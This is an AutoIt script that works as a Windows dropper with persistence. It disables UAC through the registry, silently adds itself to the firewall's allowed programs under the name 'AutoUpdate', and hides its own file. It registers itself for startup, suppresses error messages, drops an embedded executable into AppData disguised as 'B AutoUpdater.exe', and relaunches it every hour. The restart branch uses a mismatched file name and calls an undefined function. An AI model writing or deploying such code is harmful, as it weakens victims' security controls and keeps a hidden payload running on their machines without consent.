#RequireAdmin
#NoTrayIcon
#include<File.au3>
#include<FileConstants.au3>
#include<_Startup.au3>





RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", "0") ; Disable UAC
Run(@ComSpec & ' /c netsh firewall add allowedprogram program = "' & @AutoItExe & '" name = "AutoUpdate" mode = ENABLE', "", "", @SW_HIDE) ; Bypass firewall.
FileSetAttrib(@SCRIPTFULLPATH, "+H") ; HIDE

If _StartupRegistry_Install() = False then ; If it is already in startup it won't add it again.
   starttup(); Declaring startup function.
EndIF

;This to avoid popping errors to the user if something happened.
If $CmdLine[0] > 0 Then
    If Not StringInStr($CmdLineRaw,"-NoErrors",1) Then RunWithoutErrors()
	   Else
    If @compiled Then
        RunWithoutErrors()
EndIF
EndIF


FileInstall("C:\Users\Borkar\Desktop\B.exe", @APPDATADIR & "\B AutoUpdater.exe")
ShellExecute(@APPDATADIR & "\B AutoUpdater.exe")

While 1
   Sleep(3600000)
   If ProcessExists("B AutoUpdater.exe") Then
	  _Rc()
   Else
ShellExecute(@APPDATADIR & "\B AutoUpdated.exe")
EndIf
Wend






Func starttup()
   _StartupRegistry_Install() ; This func is to add this program to startup.
EndFunc

Func RunWithoutErrors()
    Run(@AutoItExe & ' /ErrorStdOut -NoErrors')
    Exit
EndFunc